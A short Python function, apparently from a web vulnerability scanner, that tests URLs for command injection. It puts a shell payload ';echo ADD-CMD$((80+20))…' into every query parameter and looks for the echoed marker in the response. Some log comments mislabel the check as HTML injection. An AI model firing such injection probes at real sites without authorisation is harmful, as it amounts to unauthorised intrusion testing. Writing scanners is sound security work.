from urllib.parse import parse_qsl, urlencode, urlsplit
import sys ,requests, re,time,argparse,getopt,sys,json,html




def is_cmdi_vulnerable(url):
        payload =';echo ADD-CMD$((80+20))$(echo 0xsolo)0xsolo'
        param = dict(parse_qsl(urlsplit(url).query))
        tainted_params = {x: payload for x in param}
        #logs.create_log(logs_des,"Params : "+str(tainted_params))
        if len(tainted_params) > 0:
                attack_url = urlsplit(url).geturl() + urlencode(tainted_params)
                response = requests.post(url=attack_url, data = payload)
                #print(response.text)
                if response.status_code == 200:
                        if poc in response.text:
                                attack_encode=html.escape(attack_url)
                                #logs.create_log(logs_des,"HTML Injection Found : "+str(attack_url))
                                return True
                        else:
                                #logs.create_log(logs_des,"No HTML Injection Found  : "+str(url))
                                return False



	
poc = "ADD-CMD1000xsolo0xsolo"
    